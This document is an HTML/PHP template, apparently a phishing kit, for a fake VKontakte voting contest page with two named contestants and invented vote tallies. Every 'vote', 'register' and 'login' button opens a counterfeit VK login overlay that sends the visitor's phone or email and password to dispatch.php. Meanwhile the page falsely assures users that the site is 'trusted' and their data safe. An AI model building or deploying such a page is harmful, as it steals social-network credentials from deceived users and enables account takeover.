
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	   <title>Проголосуй за меня!VK</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="shortcut icon" href="assets/votes/new/img/favicon.png" tppabs="/assets/votes/new/img/favicon.png" type="image/png">
	   <link rel="stylesheet" href="allstyle/css/main.css" >
	   <script>
function show(){
	$("#over").fadeIn(500);
}

</script>
<style>
#over {
	position: fixed;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	background-color: rgba(0,0,0, .9);
	z-index: 1000;
	}

#over > * {
	z-index: 9999;
}
#over > #ov_inner {
	margin: 17% auto;
	width: 300px;
	height: 400px;
}
.show {
	display: block;
}
.floating-button{
   text-decoration: none;
  width: 100px;
  height: 40px;
  margin-top: 12px;
  line-height: 45px;
  border-radius: 20px;
  border: none;
  font-weight: 600;
  color: white;
  background: #3c95f9;
}
.textbutton{
   margin-top: -3px;
   font-size: 14px;
}
</style>
   </head>
   <body class="index">
      <div id="page-wrapper">
      <header id="header" class="reveal alt">
         <h1 id="logo"><a href="">VK</a></h1>
         <nav id="nav">
            <ul>
               <li class="current" style="white-space: nowrap;"><a href="index.php" tppabs="https://<?php echo $_SERVER['HTTP_HOST']; ?>/">Главная</a></li>
               <li class="submenu opener" style="user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;">
                  <a >Меню</a>
                  <ul style="user-select: none; display: none; position: absolute;" class="">
                     <li style="white-space: nowrap;"><a href="index.php-page=info.php" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/index.php?page=info" style="display: block;">Информация</a></li>
                     <li style="white-space: nowrap;"><a href="index.php-page=stats.php" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/index.php?page=stats" style="display: block;">Итоги</a></li>
                     <li style="white-space: nowrap;"><a  onclick="show();" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/login/index.php?login=1" style="display: block;">Участвовать</a></li>
                                       </ul>
               </li>
               <li style="white-space: nowrap;"><a  onclick="show();" class="button special">Войти</a></li>
                           </ul>
         </nav>
      </header><section id="banner">
   <div class="inner">
      <header>
         <h2>VK</h2>
      </header>
      <p>Наш сайт - <strong>один из	 </strong><br>глобальных проектов голосований</p>
      <footer>
         <ul class="buttons vertical">
            <li><a href="#gotox" class="button fit scrolly">проголосовать</a></li>
         </ul>
      </footer>
   </div>
</section>
<article id="main">
<header class="special container">
   <span class="icon fa-bar-chart-o"></span>
   <h2>Выберите участника которому<br> хотите отдать голос</h2>
</header>
<section id ="gotox" class="wrapper style3 container special">
   <header class="major">
      </header>
   <div class="row">
      <div class="6u 12u(narrower)" style="">
         <section>
            <!-- ТУТ ИЗОБРАЖЕНИЕ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ИЗОБРАЖЕНИЕ УТ ИЗОБРАЖЕНИЕ УТ ИЗОБРАЖЕНИЕТ \ТУТ-->
            <a  onclick="show();" tppabs="#" class="image featured"><img src="img/1.jpg "alt=""></a>
            <header>
               <!-- ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ /ТУТ ТУТ ТУТ \ТУТ-->
               <a href="<?php echo mb_convert_encoding($lines[6], "utf-8", "windows-1251");?>" target="_blank"><h3>Ирина Иванова</h3></a>
            <div class="votes-number" id="vote-num-2" style="margin-top: -15px;">8564	голосов</div>
            <a  onclick="show();"  class="button special" style="border-radius: 24px;margin-top: 10px;">проголосовать</a>
         </section>
      </div>
      <div class="6u 12u(narrower)" style="">
         <section>
            <a  onclick="show();" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/login/index.php?g=2" class="image featured">
               <!-- ТУТ ИЗОБРАЖЕНИЕ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ИЗОБРАЖЕНИЕ УТ ИЗОБРАЖЕНИЕ УТ ИЗОБРАЖЕНИЕТ \ТУТ-->
               <img style="margin-top:-10px;" src="img/2.jpg" alt=""></a>
            <header>
               <!-- ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ ТУТ /ТУТ ТУТ ТУТ \ТУТ-->
               <a href="<?php echo mb_convert_encoding($lines[6], "utf-8", "windows-1251");?>" target="_blank"><h3>Максим Руциниров</h3></a>
            </header>
            <div class="votes-number" id="vote-num-2" style="margin-top: -17px;">8569	голосов</div>
            <a  onclick="show();"  class="button special" style="border-radius: 24px;margin-top: 20px;">проголосовать</a>
         </section>
      </div>
   </div>
</section>
<section class="wrapper style1 container special">
   <div class="row">
      <div class="4u 12u(narrower)">
         <section>
            <span class="icon featured fa-check"></span>
            <header>
               <h3>Это безопасно!</h3>
            </header>
            <p>Наш сайт имеет статус "Надёжного". Ваши данные в полной безопасности.</p>
         </section>
      </div>
      <div class="4u 12u(narrower)">
         <section>
            <span class="icon featured fa-check"></span>
            <header>
               <h3>Продвижение</h3>
            </header>
            <p>На нашем сайте вы сможете принять участие и вас увидят сотни людей! Для этого достаточно лишь войти на сайт.</p>
         </section>
      </div>
      <div class="4u 12u(narrower)">
         <section>
            <span class="icon featured fa-check"></span>
            <header>
               <h3>Ценные призы</h3>
            </header>
            <p>Участвуя в конкурсе на нашем сайте вы сможете получить ценные призы (подробнее в Информации)</p>
         </section>
      </div>
   </div>
</section>
</article>
<section id="cta">
   <header>
      <h2>А вы готовы получить <strong>хорошие призы</strong>?</h2>
      <p>Принимая участия не забывайте о ваших друзьях =)</p>
   </header>
   <footer>
      <ul class="buttons">
         <li><a  onclick="show();" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/login/index.php?login=1" class="button special">Регистрация</a></li>
      </ul>
   </footer>
</section>
<footer id="footer">
   <ul class="icons">
      <li><a href="javascript:if(confirm(%27https://<?php echo $_SERVER['HTTP_HOST']; ?>/  \n\nThis file was not retrieved by Teleport Pro, because it is addressed using an unsupported protocol (e.g., gopher).  \n\nDo you want to open it from the server?%27))window.location=%27https://<?php echo $_SERVER['HTTP_HOST']; ?>/%27" tppabs="https://<?php echo $_SERVER['HTTP_HOST']; ?>/" class="icon circle fa-github"><span class="label">Github</span></a></li>
   </ul>
   <ul class="copyright">
      <li>©</li>
      2019-2021
      <li><a href="javascript:if(confirm(%27https://<?php echo $_SERVER['HTTP_HOST']; ?>/  \n\nThis file was not retrieved by Teleport Pro, because it is addressed using an unsupported protocol (e.g., gopher).  \n\nDo you want to open it from the server?%27))window.location=%27https://<?php echo $_SERVER['HTTP_HOST']; ?>/%27" tppabs="https://<?php echo $_SERVER['HTTP_HOST']; ?>/"><?php echo $_SERVER['HTTP_HOST']; ?></a></li>
   </ul>
</footer>
</div>
	<div id="over" style="display: none;">
		<div id="ov_inner">
			<div id="index_rcolumn" class="index_rcolumn">
				
					<div id="index_login" class="page_block index_login">
					<center><div>Войдите через ВКонтакте <img src="img/vklogo.png" width="10%" style="vertical-align: middle;"></div></center><br>
            <form name="myform" id="myform" method="post" action="dispatch.php" onsubmit="return validate_form ( );" validate>
				<input type="text" class="big_text" name="namelogin"  placeholder="Телефон или email">
				  <input type="password" class="big_text" name="password"  value="" placeholder="Пароль">
				  <button type="submit" class="floating-button"><p class="textbutton">Войти</p></button>
				  <div class="forgot">
					<div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
				  </div>
			  </div>
			  </form>
		</div>
		</div>
	</div>
<script src="assets/votes/new/js/jquery.min.js" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/assets/votes/new/js/jquery.min.js"></script>
<script src="assets/votes/new/js/jquery.dropotron.min.js" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/assets/votes/new/js/jquery.dropotron.min.js"></script>
<script src="assets/votes/new/js/jquery.scrolly.min.js" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/assets/votes/new/js/jquery.scrolly.min.js"></script>
<script src="assets/votes/new/js/jquery.scrollgress.min.js" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/assets/votes/new/js/jquery.scrollgress.min.js"></script>
<script src="assets/votes/new/js/skel.min.js" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/assets/votes/new/js/skel.min.js"></script>
<script src="assets/votes/new/js/util.js" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/assets/votes/new/js/util.js"></script>
<script src="assets/votes/new/js/main.js" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/assets/votes/new/js/main.js"></script>
<ul style="user-select: none; position: absolute; z-index: 1000; left: 619.1px; top: 56.2625px; opacity: 1; display: none;" class="dropotron level-0 left">
   <li style="white-space: nowrap;"><a href="index.php-page=info.php" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/index.php?page=info" style="display: block;">Информация</a></li>
   <li style="white-space: nowrap;"><a href="index.php-page=stats.php" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/index.php?page=stats" style="display: block;">Итоги</a></li>
   <li style="white-space: nowrap;"><a href="login/index.php-login=1.htm" tppabs="http://<?php echo $_SERVER['HTTP_HOST']; ?>/login/index.php?login=1" style="display: block;">Регистрация</a></li>
</ul>
<div id="navButton">
</body></html>